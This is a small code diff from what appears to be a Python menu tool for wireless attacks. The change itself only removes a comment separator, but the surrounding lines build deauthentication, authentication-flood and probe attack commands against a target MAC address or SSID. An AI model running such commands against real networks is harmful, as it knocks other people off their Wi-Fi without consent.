@@ -332,7 +332,7 @@ def main_menu():
                             cmd_deauth = base_cmd + ["d", "-B", target_mac]
                             cmd_auth = base_cmd + ["a", "-a", target_mac, "-s", "500"]
                             run_attack([cmd_deauth, cmd_auth])
-                        # ----------------------------------------
+                        
 
                         elif act == '7': run_attack(base_cmd + ["p", "-t", target_mac, "-b", "nul"])
                         elif act == '8': run_attack(base_cmd + ["w", "-e", target_ssid, "-z"])
